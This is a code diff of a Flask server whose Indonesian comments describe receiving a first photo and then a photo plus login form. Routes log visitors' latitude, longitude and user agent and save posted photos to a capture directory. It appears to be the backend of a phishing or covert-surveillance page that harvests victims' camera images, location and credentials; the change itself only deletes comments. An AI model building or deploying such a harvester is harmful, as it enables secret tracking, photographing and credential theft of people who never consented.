@@ -9,7 +9,6 @@ os.makedirs(CAPTURE_DIR, exist_ok=True)
 def index():
     return render_template("index.html")
 
-# terima foto awal
 @app.route('/berhasil_awal', methods=['POST'])
 def berhasil_awal():
     data = request.get_json()
@@ -18,7 +17,6 @@ def berhasil_awal():
     print("Lokasi awal:", data.get("lat"), data.get("lon"), "UA:", data.get("ua"))
     return "OK"
 
-# terima foto + form login
 @app.route('/berhasil', methods=['POST'])
 def berhasil():
     photo = request.form.get("photo")
@@ -49,4 +47,4 @@ def save_photo(photo_data, label):
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-        
+              
